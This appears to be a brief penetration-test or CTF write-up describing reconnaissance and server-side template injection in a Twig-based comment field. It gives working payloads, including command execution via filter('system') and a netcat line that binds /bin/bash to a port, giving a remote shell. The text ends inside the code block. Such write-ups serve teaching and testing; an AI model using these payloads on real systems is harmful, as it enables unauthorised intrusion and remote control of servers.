# Exploitation

## Reconnaissance
A port scan revealed the following services:
- HTTP service running on port 80
- MySQL service running on port 3306

The web application was accessible via a browser and allowed
user-generated comments, which became the primary attack vector.

## SSTI Detection
The following payload was submitted via the comment field to test
whether server-side template evaluation was occurring:

```twig
{{7*7}}
49
{{7*'7'}}
49
{{ ['id'] | filter('system') }}
{{ ['nc -nvlp 1337 -e /bin/bash'] | filter('system') }}
